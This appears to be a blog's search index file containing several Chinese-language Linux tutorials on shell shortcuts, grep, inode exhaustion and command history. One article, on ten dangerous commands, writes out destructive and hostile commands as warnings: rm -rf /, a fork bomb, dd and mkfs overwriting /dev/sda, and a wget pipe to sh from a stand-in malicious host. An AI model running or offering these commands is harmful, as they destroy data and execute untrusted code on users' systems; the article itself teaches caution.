<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux 技巧</title>
      <link href="/2024/07/29/seventeen/"/>
      <url>/2024/07/29/seventeen/</url>
      
        <content type="html"><![CDATA[<p>如果要谨慎使用 rm 命令，可以为它设置一个别名，在删除文件之前需要进行确认才能删除。有些系统管理员会默认使用这个别名，<br>对于这种情况，你可能需要看看下一个技巧。</p><pre><code>$ rm -i    &lt;== 请求确认</code></pre><p>你可以使用 unalias 命令以交互方式禁用别名。它不会更改别名的配置，而仅仅是暂时禁用，直到下次登录或重新设置了这一个别名才会重新生效。$ unalias rm如果已经将 rm -i 默认设置为 rm 的别名，但你希望在删除文件之前不必进行确认，则可以将 unalias 命令放在一个启动文件（例如 ~/.bashrc）中。<br>如果你经常在只有 root 用户才能执行的命令前忘记使用 sudo，这里有两个方法可以解决。一是利用命令历史记录，可以使用 sudo !!（使用 !! 来运行最近的命令，并在前面添加 sudo）来重复执行，二是设置一些附加了所需 sudo 的命令别名。$ alias update=’sudo apt update’<br>有时命令行技巧并不仅仅是一个别名。毕竟，别名能帮你做的只有替换命令以及增加一些命令参数，节省了输入的时间。但如果需要比别名更复杂功能，可以通过编写脚本、向 .bashrc 或其他启动文件添加函数来实现。例如，下面这个函数会在创建一个目录后进入到这个目录下。在设置完毕后，执行 source .bashrc，就可以使用 md temp 这样的命令来创建目录立即进入这个目录下。md () { mkdir -p “$@” &amp;&amp; cd “$1”; }<br>这里有很多快捷键可以帮我们修正自己的命令。接下来使用光标二字代替光标的位置。<br>删除从开头到光标处的命令文本<br>ctrl + u，例如：$ cd /proc/tty;ls -al光标如果此时使用ctrl+u快捷键，那么该条命令都会被清除，而不需要长按backspace键。<br>删除从光标到结尾处的命令文本<br>ctrl+k，例如：$ cd /proc/tty光标;ls -al如果此时使用ctrl + k快捷键，那么从光标开始处到结尾的命令文本将会被删除。<br>还有其他的操作，不再举例，例如：<br>ctrl + a:光标移动到命令开头<br>ctrl + e：光标移动到命令结尾<br>alt  f:光标向前移动一个单词<br>alt  b：光标向前移动一个单词<br>ctrl w：删除一个词（以空格隔开的字符串）<br>我们都知道history记录了执行的历史命令，而使用!＋历史命令前的数字，可快速执行历史命令。</p><h1 id="部分历史命令查看"><a href="#部分历史命令查看" class="headerlink" title="部分历史命令查看"></a>部分历史命令查看</h1><p>history会显示大量的历史命令，而fs -l只会显示部分。<br>$ tail -f filename.logtail -f 加文件名，可以实时显示日志文件内容。当然，使用less命令查看文件内容，并且使用shift+f键，也可达到类似的效果。<br>怎么知道当前磁盘是否满了呢？</p><pre><code>$ df -h/dev/sda14      4.6G   10M  4.4G   1% /tmp/dev/sda11      454M  366M   61M  86% /boot/dev/sda15       55G   18G   35G  35% /home/dev/sda1       256M   31M  226M  12% /boot/efitmpfs           786M   64K  786M   1% /run/user/1000</code></pre><p>使用df命令可以快速查看各挂载路径磁盘占用情况。<br>当前目录各个子目录占用空间大小<br>如果你已经知道home目录占用空间较大了，你想知道home目录下各个目录占用情况：<br>这里指定了目录深度，否则的话，它会递归统计子目录占用空间大小，可自行尝试。</p><pre><code>$ free -h              total        used        free      shared  buff/cache   availableMem:           7.7G        3.5G        452M        345M        3.7G        3.5GSwap:          7.6G          0B        7.6G</code></pre><p>通过free的结果，很容易看到当前总共内存多少，剩余可用内存多少等等。<br>不知道你是否注意到，我们在前面几个命令中，都使用了-h参数，它的作用是使得结果以人类可读的方式呈现，所以我们看到它呈现的单位是G,M等，如果不使用-h参数，可以自己尝试一下会是什么样的结果呈现。<br>根据名称查找进程id<br>想快速直接查找进程id，可以使用：<br>pgrep hello2.22692或者：</p><pre><code>$ pidof hello22692</code></pre><p>其中，hello是进程名称。</p><h1 id="根据名称杀死进程"><a href="#根据名称杀死进程" class="headerlink" title="根据名称杀死进程"></a>根据名称杀死进程</h1><p>一般我们可以使用kill　-9 pid方式杀死一个进程，但是这样就需要先找到这个进程的进程id，实际上我们也可以直接根据名称杀死进程，例如：$ killall hello或者：<br>可以使用下面的命令查看进程已运行时间：</p><pre><code>$ ps -p 24525 -o lstart,etime                 STARTED     ELAPSEDSat Mar 23 20:52:08 2019       02:45</code></pre><p>其中24525是你要查看进程的进程id。</p><h1 id="快速目录切换"><a href="#快速目录切换" class="headerlink" title="快速目录切换"></a>快速目录切换</h1><p>cd -　回到上一个目录cd  回到用户家目录<br>我们知道使用分号隔开可以执行多条命令，例如：$ cd /temp/log/;rm -rf *但是如果当前目录是/目录，并且/temp/log目录不存在，<br>那么就会发生激动人心的一幕：</p><pre><code>bash: cd: /temp/log: No such file or directory</code></pre><p>因为;可以执行多条命令，但是不会因为前一条命令失败，而导致后面的不会执行，因此，cd执行失败后，仍然会继续执行rm -rf <em>，<br>由于处于/目录下，结果可想而知。<br>所以你还以为这种事故是对rf -rf </em>的力量一无所知的情况下产生的吗？<br>如果解决呢？很简单，使用&amp;&amp;，例如:$ cd /temp/log/&amp;&amp;rm -rf *<br>这样就会确保前一条命令执行成功，才会执行后面一条。<br>有时候日志文件是压缩的，那么能不能偷懒一下，不解压查看呢？当然可以啦。<br>例如</p><pre><code>$ zcat test.gztest log</code></pre><p>或者：</p><pre><code>$ zless test.gztest log</code></pre><p>比如有一个大文件，你想快速删除，或者不想删除，但是想清空内容：</p><pre><code>&gt;filename</code></pre><h1 id="将日志同时记录文件并打印到控制台"><a href="#将日志同时记录文件并打印到控制台" class="headerlink" title="将日志同时记录文件并打印到控制台"></a>将日志同时记录文件并打印到控制台</h1><p>在执行shell脚本，常常会将日志重定向，但是这样的话，控制台就没有打印了，如何使得既能记录日志文件，又能将日志输出到控制台呢？</p><pre><code>$ ./test.sh |tee test.log</code></pre><h1 id="终止并恢复进程执行"><a href="#终止并恢复进程执行" class="headerlink" title="终止并恢复进程执行"></a>终止并恢复进程执行</h1><p>我们使用ctrl+z 暂停一个进程的执行，也可以使用fg恢复执行。例如我们使用<br>当我们发现文件内容可能很多时，使用ctrl+z暂停程序，而如果又想要从刚才的地方继续执行，则只需要使用fg命令即可恢复执行。或者使用bg使得进程继续在后台执行。<br>我们可能会进程写一些小程序，并且想要知道它的运行时间，实际上我们可以很好的利用time命令帮我们计算，例如：</p><pre><code>$ time ./fibo 30the 30 result is 832040real    0m0.088suser    0m0.084ssys    0m0.004s</code></pre><p>它会显示系统时间，用户时间以及实际使用的总时间。</p><h1 id="查看内存占用前10的进程"><a href="#查看内存占用前10的进程" class="headerlink" title="查看内存占用前10的进程"></a>查看内存占用前10的进程</h1><pre><code>$ ps -aux|sort -k4nr |head -n 10</code></pre><p>我们都知道man可以查看命令的帮助手册，但是如果我们想要某个功能却不知道使用哪个命令呢？别着急，还是可以使用man：</p><pre><code>$ man -k &quot;copy files&quot;cp (1)               - copy files and directoriescpio (1)             - copy files to and from archivesgit-checkout-index (1) - Copy files from the index to the working treegvfs-copy (1)        - Copy filesgvfs-move (1)        - Copy filesinstall (1)          - copy files and set attributes</code></pre><p>使用-k参数，使得与copy files相关的帮助手册都显示出来了。<br>我们知道，在命令行下，复制不能再是ctrl + c了，因为它表示终止当前进程，而控制台下的复制粘贴需要使用下面的快捷键：</p><pre><code>ctrl +  insertshift + insert</code></pre><p>例如，要在当前目录下查找包含test字符串的文件：</p><pre><code>$ grep -rn &quot;test&quot;test2.txt:1:test</code></pre><p>它便可以找到该字符串在哪个文件的第几行。<br>程序运行时，终端可能输出大量的日志，你想简单查看一下，又不想记录日志文件，此时可以使用ctrl+s键，冻结屏幕，使得日志不再继续输出，而如果想要恢复，可使用ctrl+q退出冻结。<br>如果在某些系统上连基本的vi编辑器都没有，那么可以使用下面的方式进行编辑内容：</p><pre><code>$ cat &gt;file.txtsome words(ctrl+d)</code></pre><p>编辑完成后，ctrl+d即可保存。</p><h1 id="查看elf文件头信息"><a href="#查看elf文件头信息" class="headerlink" title="查看elf文件头信息"></a>查看elf文件头信息</h1><p>例如：</p><pre><code>$ readelf -h filename</code></pre><p>我们在显示结果中，可以看到运行的平台，elf文件类型，大小端情况等。<br>查看库中是否包含某个接口</p><pre><code>$ nm filename |grep interface</code></pre><p>这里是从文件filename中查看是否包含interface接口，前提是该文件包含符号表。<br>如果要对一个已输入的命令进行修改，可以使用 ^a（ctrl + a）或 ^e（ctrl + e）将光标快速移动到命令的开头或命令的末尾。<br>还可以使用 ^ 字符实现对上一个命令的文本替换并重新执行命令，例如 ^before^after^ 相当于把上一个命令中的 before 替换为 after 然后重新执行一次。</p><h1 id="使用远程机器的名称登录到机器上"><a href="#使用远程机器的名称登录到机器上" class="headerlink" title="使用远程机器的名称登录到机器上"></a>使用远程机器的名称登录到机器上</h1><p>如果使用命令行登录其它机器上，可以考虑添加别名。在别名中，可以填入需要登录的用户名（与本地系统上的用户名可能相同，也可能不同）以及远程机器的登录信息。例如使用 server_name =’ssh -v -l username IP-address’ 这样的别名命令：</p><pre><code>$ alias butterfly=”ssh -v -l jdoe 192.168.0.11”</code></pre><p>也可以通过在 /etc/hosts 文件中添加记录或者在 DNS 服务器中加入解析记录来把 IP 地址替换成易记的机器名称。<br>执行 alias 命令可以列出机器上已有的别名。</p><pre><code>$ aliasalias butterfly=&#39;ssh -v -l jdoe 192.168.0.11&#39;alias c=&#39;clear&#39;alias egrep=&#39;egrep --color=auto&#39;alias fgrep=&#39;fgrep --color=auto&#39;alias grep=&#39;grep --color=auto&#39;alias l=&#39;ls -CF&#39;alias la=&#39;ls -A&#39;</code></pre><p>只要将新的别名添加到 ~/.bashrc 或类似的文件中，就可以让别名在每次登录后都能立即生效。<br>^s（ctrl + s）将通过执行流量控制命令 XOFF 来停止终端输出内容，这会对 PuTTY 会话和桌面终端窗口产生影响。<br>如果误输入了这个命令，可以使用 ^q（ctrl + q）让终端重新响应。所以只需要记住 ^q 这个组合键就可以了，毕竟这种情况并不多见。<br>Linux 提供了很多让用户复用命令的方法，其核心是通过历史缓冲区收集执行过的命令。复用命令的最简单方法是输入 ! 然后接最近使用过的命令的开头字母；<br>当然也可以按键盘上的向上箭头，直到看到要复用的命令，然后按回车键。还可以先使用 history 显示命令历史，然后输入 ! 后面再接命令历史记录中需要复用的命令旁边的数字。<br>!! &lt;== 复用上一条命令!ec &lt;== 复用上一条以 “ec” 开头的命令!76 &lt;== 复用命令历史中的 76 号命令</p><h1 id="查看日志文件并动态显示更新内容"><a href="#查看日志文件并动态显示更新内容" class="headerlink" title="查看日志文件并动态显示更新内容"></a>查看日志文件并动态显示更新内容</h1><p>使用形如 tail -f /var/log/syslog 的命令可以查看指定的日志文件，并动态显示文件中增加的内容，<br>需要监控向日志文件中追加内容的的事件时相当有用。这个命令会输出文件内容的末尾部分，并逐渐显示新增的内容。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux inode资源耗尽问题</title>
      <link href="/2024/07/29/sixteen/"/>
      <url>/2024/07/29/sixteen/</url>
      
        <content type="html"><![CDATA[<p>Linux系统下文件数据储存在”块”中，文件的元信息，例如文件的创建者、文件的创建日期、文件的大小等。<br>这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。<br>inode也占用硬盘空间，硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；<br>另一个是inode区（inode table），存放inode所包含的信息。<br>每个inode节点的大小，一般是128字节或256字节。inode节点的总数，在格式化时就给定，一般是每1KB或每2KB就设置一个inode。<br>假定在一块1GB的硬盘中，每个inode节点的大小为128字节，每1KB就设置一个inode，那么inode table的大小就会达到128MB，<br>占整块硬盘的12.8%。<br>inodes使用完与存储空间使用完相似，都是创建不了文件或无法正常执行一些命令。inodes使用完，存储空间可能还有，<br>这种情况一般是生成了大量的小文件，把inode table占满。<br>一般情况下存储空间使用完，inodes往往才使用百分之几，所以容易忽视对inodes使用情况的监控。<br>借用网图来说明inodes用尽，而磁盘空间还未用完的情况：<br>查看磁盘空间使用情况，使用df命令<br>查看inodess使用情况，使用df -i命令<br>上述两个命令可以使用-h参数，命令为df -h和df -hi。从图中看见磁盘空间使用71%，但是inodes使用100%。<br>inodes的大小在磁盘格式化分区时确定，跟分区的大小相关，分区越大，inodes越大，反之亦然。<br>linux操作系统根目录一般分区比较小，如果有定时性的小文件产生而又未及时清理，则很容易造成inodes占满。<br>inodes占满解决步骤：<br>（1）查看文件最多的目录</p><pre><code>for i in /*; do echo $i; find $i | wc -l; done</code></pre><p>如果确定目录范围，把/*写的具体点<br>最终发现是/var/spool/postfix/maildrop目录下小文件过多，原因如下：<br>由于linux在执行cron时，会将cron执行脚本中的output和warning信息，都会以邮件的形式发送给cron所有者。<br>由于客户环境中的sendmail和postfix没有正常运行，邮件发送不成功，导致全部小文件都堆积在maildrop目录下，<br>另由于缺乏自动清理的机制，故此目录下堆积了大量的文件。<br>经过排查root用户下发现有个每分钟进行一次时钟同步的定时任务，该定时任务每分钟产生一个小文件。<br>（2）删除大量文件</p><pre><code>ls | xargs -n 1000 rm -rf</code></pre><p>需要使用xargs命令，不然会删除失败。<br>（1）设置方面<br>在crontab -e 第一行增加MAILTO=”” ，就没有文件产生啦<br>（2）重定向<br>对定时任务设置定向输出文件，不需要日志输出的定时任务可以将日志重定向到/dev/null，如下：</p><pre><code>*/10 * * * * /tmp/test.sh &gt;/dev/null 2&gt;&amp;1</code></pre><p>（3）定时清理文件</p><pre><code>find 目录 -type f -mtime +30 | xargs -n 1000 rm -f</code></pre><p>（4）监控inodes的使用<br>备注：应注意crontab的写法和产生的文件的定时清理</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux grep 文本查找</title>
      <link href="/2024/07/29/fifteen/"/>
      <url>/2024/07/29/fifteen/</url>
      
        <content type="html"><![CDATA[<p>之前介绍过很多linux下查找相关的命令，而对文件内容搜索的命令似乎还没有涉及，因此本文介绍文本搜索命令–grep。<br>常见用法<br>我们会经常结合管道符（|）来使用它，即在前面命令执行的结果中查找包含相关字符串的内容。例如：</p><pre><code>$ ps -ef|grep redis</code></pre><p>ps -ef用于查看系统进程情况，但是它列出的结果很多，如果我们只想看到自己需要的，则通过管道符，用grep进行过滤搜索，<br>例如搜索redis相关的进程，最后它只会列出和redis相关的进程了：</p><pre><code>$  ps -ef|grep redisroot     10748 10733  0 21:14 pts/21   00:00:00 redis-server *:6379root     10754 10733  0 21:14 pts/21   00:00:00 grep --color=auto redis</code></pre><p>那么如果要排除某些不相关信息呢？我们可以使用-v参数</p><pre><code>$ ps -ef|grep redis |grep -v autoroot     10748 10733  0 21:14 pts/21   00:00:00 redis-server *:6379</code></pre><p>这样一来，包含auto相关的结果就不会出现在最终结果里了。<br>如果只想统计结果数量呢？我们可以结合-c（count）参数：</p><pre><code>$ ps -ef|grep redis -c2</code></pre><h1 id="文件内容搜索"><a href="#文件内容搜索" class="headerlink" title="文件内容搜索"></a>文件内容搜索</h1><p>好了，说完了最常见的用法，我们来看看如何搜索文件内容。实际上awk和sed在这方面也颇有经验，不过本文的主角是grep，<br>所以另外两个命令暂时不涉及。我们来看几个实例。<br>在指定文件中查找指定关键字<br>例如，要在linux_command_debug.md文件中，查找test字符串：</p><pre><code>$  grep &quot;test&quot; aaa/bbb/linux_command_debug.mdint test(int a,int b)    test(a,b);</code></pre><p>如果想要显示指定关键字的行号，可以使用-n参数，例如：</p><pre><code>$  grep -n &quot;test&quot; aaa/bbb/linux_command_debug.md18:int test(int a,int b)27:    test(a,b);</code></pre><h1 id="搜索时指定或排除多个文件"><a href="#搜索时指定或排除多个文件" class="headerlink" title="搜索时指定或排除多个文件"></a>搜索时指定或排除多个文件</h1><p>前面提到了对一个文件内容进行搜索，如果是多个呢？或者不想从某些文件里搜索呢？<br>如果想对文件进行指定也是可以的，例如搜索所有的md结尾的文件：</p><pre><code>$  grep -n &quot;test&quot; *.md</code></pre><p>或者可以使用–exclude参数来排除某些文件，例如，查找包含test，但是排除txt文件：</p><pre><code>$ grep -rn &quot;test&quot; --exclude=*.txt</code></pre><p>搜索时就会忽略.txt结尾的文件了。<br>如果要排除的条件比较多，可以将要排除的条件存储在另外一个文件里：</p><pre><code>$ grep -rn &quot;test&quot; --exclude-from=skip.txt</code></pre><p>skip.txt的内容可以是模式匹配的文件名或者具体文件名：</p><pre><code>*.txttest.md</code></pre><p>这样，以.txt结尾，以及test.md文件都不会搜索了。<br>除此之外，还可以排除指定目录，它需要用到–exclude-dir参数：</p><pre><code>$ grep -rn &quot;test&quot; --exclude-dir=aaa</code></pre><p>它在搜索时将会跳过aaa目录下的文件。</p><h1 id="查找包含指定关键字的文件"><a href="#查找包含指定关键字的文件" class="headerlink" title="查找包含指定关键字的文件"></a>查找包含指定关键字的文件</h1><p>如果要在当前目录下所有文件查找包含“int main(void)”字符串的文件：</p><pre><code>$ grep -rn &quot;int main(void)&quot;aaa/bbb/c_main_func.md:49:int main(void)aaa/bbb/c_main_func.md:71:int main(void) { /* ... */ }aaa/bbb/c_array.md:104:int main(void)aaa/bbb/c_array.md:129:int main(void)aaa/bbb/pc-lint.md:42:int main(void)aaa/bbb/pc-lint.md:128:int main(void)</code></pre><p>这可能是最实用的使用方法之一了。这里-r参数表示递归查找当前目录的文件，-n会显示查找位置的行号，如果只想显示包含该指定关键字的文件名，可使用-l（–file-with-matches）参数：</p><pre><code>$ grep -rln &quot;int main(void)&quot;aaa/bbb/c_main_func.mdaaa/bbb/c_array.mdaaa/bbb/pc-lint.md</code></pre><p>如果你尝试一下就会发现，如果不带-r参数，它会暂停，等待你从控制台输入，例如：</p><pre><code>$ grep -n &quot;test&quot;test1:test</code></pre><p>所以使用时记得带上相关参数奥！</p><h1 id="查找不包含指定关键字的文件"><a href="#查找不包含指定关键字的文件" class="headerlink" title="查找不包含指定关键字的文件"></a>查找不包含指定关键字的文件</h1><p>前面提到了如何查找包含某个关键字的文件，如果要找的是不包含该关键字的文件呢？<br>实际上只要使用-L参数即可:</p><pre><code>$ grep -rLn &quot;int main(void)&quot;</code></pre><p>(这里会显示不包含指定关键字内容的文件名)</p><h1 id="搜索时忽略大小写"><a href="#搜索时忽略大小写" class="headerlink" title="搜索时忽略大小写"></a>搜索时忽略大小写</h1><p>使用-i（–ignore-case）参数即可：</p><pre><code>$ grep -rni &quot;int MAIN(void)&quot;aaa/bbb/c_main_func.md:49:int main(void)aaa/bbb/c_main_func.md:71:int main(void) { /* ... */ }aaa/bbb/c_array.md:104:int main(void)aaa/bbb/c_array.md:129:int main(void)aaa/bbb/pc-lint.md:42:int main(void)aaa/bbb/pc-lint.md:128:int main(void)</code></pre><h1 id="搜索显示不包含指定关键字的行"><a href="#搜索显示不包含指定关键字的行" class="headerlink" title="搜索显示不包含指定关键字的行"></a>搜索显示不包含指定关键字的行</h1><p>前面的大部分例子都是显示符合条件的行，如果要显示不符合条件的行呢？可以用我们前面提到的-v参数：</p><pre><code>$ grep -rnv &quot;int main(void)&quot;</code></pre><p>(内容较多，未显示)<br>从结果中就会发现，它会展示出包含指定关键字的文件，但是展示的是不包含该关键字的行。</p><h1 id="显示指定关键字前后内容"><a href="#显示指定关键字前后内容" class="headerlink" title="显示指定关键字前后内容"></a>显示指定关键字前后内容</h1><p>假如你需要查看包含指定关键字行附近的行，前面的方式是没有办法看到的，不过我们可以用-A(–after-context=)和-B(–before-context=)参数来显示前后的行：</p><pre><code>$ grep -rn &quot;int main(void)&quot; -A 1 -B 1aaa/bbb/c_array.md-103-}aaa/bbb/c_array.md:104:int main(void)aaa/bbb/c_array.md-105-{</code></pre><p>(其他内容省略)<br>通过最后加上-A和-B参数，显示了指定关键字前后的行，这在日志搜索分析时非常有用。<br>指定规则文件进行搜索<br>如果有多个搜索关键字怎么处理呢？我们可以把关键字写在一个文件，搜索时指定文件即可，例如规则文件为key.txt：</p><pre><code>int main(void)test</code></pre><p>从指定文件中搜索上面的关键字：</p><pre><code>$ cat filename |grep -f key.txt</code></pre><p>这样结果就会显示匹配key.txt文件中所有关键字的行，非常适合用于多个条件的搜索。</p><h1 id="正则表达式搜索"><a href="#正则表达式搜索" class="headerlink" title="正则表达式搜索"></a>正则表达式搜索</h1><p>看完前面的内容，是不是还没有感受到grep的强大？grep的另一个强大之处是，它的搜索支持正则表达式，例如查找文本行以t开头，<br>以t结尾的文件：</p><pre><code>$ grep -rn ^t.*t$key.txt:2:testaaa/bbb/c_operate_redis_start.md:68:typedef struct Stu_Info_Structaaa/bbb/c_operate_redis_start.md:101:typedef struct Stu_Info_Struct</code></pre><p>其中^t，表明以t开头，t$表明以t结尾，如果需要使用扩展的正则表达式进行搜索，可使用egrep命令。<br>关于正则表达式的写法，本文不做详细介绍。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在内容搜索方面，grep常常能够助我们一臂之力，因此掌握grep的使用也是linux学习不可缺少的一部分，当然我们不需要完全记住每个参数的作用，但我们至少知道有这样的参数，并且在需要时能够快速查询到。本文常用参数如下：<br>    • -v #显示不包含匹配关键字的所有行。<br>    • -l #显示包含匹配关键字的文件<br>    • -L #显示不包含匹配关键字的文件<br>    • -r #递归搜索<br>    • -i #忽略大小写<br>    • -n #显示关键字所在行号<br>    • -A n #显示关键字后n行<br>    • -B n #显示关键字前n行<br>    • –exclude #搜索时排除某些文件<br>    • –exclude-dir #搜索时排除某些目录<br>    • -f #指定规则文件进行搜索</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 10个危险的命令</title>
      <link href="/2024/07/28/fourteen/"/>
      <url>/2024/07/28/fourteen/</url>
      
        <content type="html"><![CDATA[<p>Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么时候。<br>这篇文章将会向你介绍十条命令，但你最好不要尝试着去使用。<br>当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普通用户身份下，破坏的只是自己的一亩三分地。</p><h1 id="rm-rf-命令"><a href="#rm-rf-命令" class="headerlink" title="rm -rf 命令"></a>rm -rf 命令</h1><p>rm -rf命令是删除文件夹及其内容最快的方式之一。<br>仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。<br>下列是一些rm 命令的选项：<br>    • rm　命令在Linux下通常用来删除文件。<br>    • rm -r 命令递归的删除文件夹，甚至是空的文件夹<br>    • rm -f 命令能不经过询问直接删除‘只读文件’。Linux下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f这个参数只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的rm命令其实也是没有删除提示的，只是一般的发行版都会将rm通过别名的方式增加-i参数来要求删除确认，而-f则抑制了这个提示。<br>    • rm -rf / : 强制删除根目录下所有东东。<br>    • rm -rf *:　强制删除当前目录的所有文件。<br>    • rm -rf . : 强制删除当前文件夹及其子文件夹。<br>从现在起，当你要执行rm -rf命令时请留心一点。我们可以在“.bashrc”文件对‘rm‘命令创建rm -i的别名，来预防用 ‘rm‘命令删除文件时的事故，它会要求你确认每一个删除请求。（译注：大多数发行版已经这样做了，如果还没有，请这样做，并在使用-f参数前一定考虑好你在做什么！译者本人有着血泪的教训啊。）</p><h1 id="amp-命令"><a href="#amp-命令" class="headerlink" title=":(){:|:&amp;};: 命令"></a>:(){:|:&amp;};: 命令</h1><p>这就是个fork 炸弹的实例。<br>具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。</p><h1 id="命令-gt-dev-sda"><a href="#命令-gt-dev-sda" class="headerlink" title="命令　&gt; /dev/sda"></a>命令　&gt; /dev/sda</h1><p>这个命令会将某个‘命令‘的输出写到块设备/dev/sda中。<br>该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。</p><h1 id="mv-文件夹-dev-null"><a href="#mv-文件夹-dev-null" class="headerlink" title="mv 文件夹 /dev/null"></a>mv 文件夹 /dev/null</h1><p>这个命令会移动某个‘文件夹‘到/dev/null。<br>在Linux中 /dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。<br>当然，要说明的是这个命令并不能阻止数据恢复软件——所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成。</p><h1 id="wget-http-malicious-source-O-sh"><a href="#wget-http-malicious-source-O-sh" class="headerlink" title="wget http://malicious_source -O- | sh"></a>wget <a href="http://malicious_source" target="_blank" rel="noopener">http://malicious_source</a> -O- | sh</h1><p>该命令会从一个（也许是）恶意源下载一个脚本并执行。<br>Ｗget命令会下载这个脚本，而sh会（无条件的）执行下载下来的脚本。<br>注意: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。</p><h1 id="mkfs-ext3-dev-sda"><a href="#mkfs-ext3-dev-sda" class="headerlink" title="mkfs.ext3 /dev/sda"></a>mkfs.ext3 /dev/sda</h1><p>上列命令会格式化块设备‘sda’，在执行这个命令后你的块设备(硬盘驱动器)会被格式化，直接让你的系统达到不可恢复的阶段。<br>通常我们不会直接使用/dev/sda这样的设备，除非是作为raw设备使用。<br>一般都需要将sda分成类似sda1、sda2这样的分区后才使用。当然，无论你使用sda还是sda1，这样对块设备或分区进行mkfs都是毁灭性的，上面的数据都会被蒸发了。</p><h1 id="gt-file"><a href="#gt-file" class="headerlink" title="&gt; file"></a>&gt; file</h1><p>这个命令常用来清空文件内容或记录命令输出。<br>不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。<br>你可能真正想用的是“&gt;&gt;”，即累加新的输出到文件，而不是刷新那个文件。<br>如果用上列执行时输入错误或无知的输入类似 “&gt; xt.conf”　的命令会覆盖配置文件或其他任何的系统配置文件。</p><h1 id="foo-bar"><a href="#foo-bar" class="headerlink" title="^foo^bar"></a>^foo^bar</h1><p>这个命令用来编辑先前运行的命令而无需重打整个命令。<br>用foobar命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。</p><h1 id="dd-if-dev-random-of-dev-sda"><a href="#dd-if-dev-random-of-dev-sda" class="headerlink" title="dd if=/dev/random of=/dev/sda"></a>dd if=/dev/random of=/dev/sda</h1><p>这个命令会向块设备sda写入随机的垃圾文件从而擦出数据，让你的系统可能陷入混乱和不可恢复的状态。<br>记得上面说过mv到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。</p><h1 id="隐藏命令"><a href="#隐藏命令" class="headerlink" title="隐藏命令"></a>隐藏命令</h1><p>下面的命令其实就是上面第一个命令 (rm -rf)。<br>这里的代码是隐藏在十六进制里的,一个无知的用户可能就会被愚弄，如果在终端里运行下面命令可能会擦除你的根分区。<br>真正的危险是隐藏起来的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。<br>切记，千万不要编译／运行从未知来源的代码。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Shell一些快捷键</title>
      <link href="/2024/07/28/thirteen/"/>
      <url>/2024/07/28/thirteen/</url>
      
        <content type="html"><![CDATA[<p>ctrl+a:光标移到行首。<br>ctrl+e:光标移到行尾。<br>ctrl+b:光标左移一个字母, 向行首移动一个字符<br>ctrl+f:光标右移,向行尾移动一个字符<br>ctrl+c:杀死当前进程。<br>ctrl+d:退出当前 Shell,从Shell提示中注销并关闭，使用该快捷键就不必键入exit<br>ctrl+h:删除光标前一个字符，同 backspace 键相同。<br>ctrl+l:清屏，相当于clear。<br>ctrl+r:搜索之前打过的命令。会有一个提示，根据你输入的关键字进行搜索bash的history<br>ctrl+k:清除光标后至行尾的内容。<br>ctrl+u:清除光标前至行首间的所有内容。<br>ctrl+w:移除光标前的一个单词<br>ctrl+t:交换光标位置前的两个字符(包括光标所在的当前位置)<br>ctrl+y:粘贴或者恢复上次的删除<br>ctrl+d:删除光标所在字母;注意和backspace以及ctrl+h的区别，这2个是删除光标前的字符<br>ctrl+z:把当前进程转到后台运行，使用’ fg ‘命令恢复。比如top -d1<br>然后ctrl+z ，到后台，然后fg,重新恢复</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux history 显示命令执行的时间</title>
      <link href="/2024/07/28/twleve/"/>
      <url>/2024/07/28/twleve/</url>
      
        <content type="html"><![CDATA[<p>显示历史命令之行时间</p><pre><code>echo &quot;export HISTTIMEFORMAT=&quot;%F %T  &quot;&quot; &gt;&gt; ~/.bashrc</code></pre><p>一次会话的话先执行</p><pre><code>export HISTTIMEFORMAT=&quot;%F %T&quot;</code></pre><p>然后使用history 命令就行了</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 删除大量文件效率对比</title>
      <link href="/2024/07/24/eleven/"/>
      <url>/2024/07/24/eleven/</url>
      
